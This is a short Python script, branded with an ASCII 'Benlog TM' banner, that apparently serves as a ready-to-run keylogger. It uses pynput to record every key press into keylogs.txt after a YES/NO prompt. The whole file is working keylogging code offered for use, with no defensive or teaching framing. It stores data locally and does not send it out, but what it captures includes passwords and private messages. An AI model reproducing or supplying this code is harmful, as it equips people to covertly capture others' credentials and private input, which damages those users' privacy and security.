from pynput import keyboard

print("""

░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗███████╗░░████████╗░█████╗░
░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║██╔════╝░░╚══██╔══╝██╔══██╗
░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║█████╗░░░░░░░██║░░░██║░░██║
░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░░░░░░██║░░░██║░░██║
░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗░░░░░██║░░░╚█████╔╝
░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░░░░░╚═╝░░░░╚════╝░

██████╗░███████╗███╗░░██╗██╗░░░░░░█████╗░░██████╗░
██╔══██╗██╔════╝████╗░██║██║░░░░░██╔══██╗██╔════╝░
██████╦╝█████╗░░██╔██╗██║██║░░░░░██║░░██║██║░░██╗░
██╔══██╗██╔══╝░░██║╚████║██║░░░░░██║░░██║██║░░╚██╗
██████╦╝███████╗██║░╚███║███████╗╚█████╔╝╚██████╔╝
╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝░╚════╝░░╚═════╝░ TM


""")




class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print('Key')
        with open(self.filename, 'a') as logs:
            logs.write(self.get_char(key))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()

while True:

    would = input("Would you like to run this program? YES/NO ")

    if would.lower() == 'yes':
        if __name__ == '__main__':
            logger = KeyLogger()
            logger.main()
            input()
    elif would.lower() == 'no':
        exit()
    else:
        print("Not a valid response.")

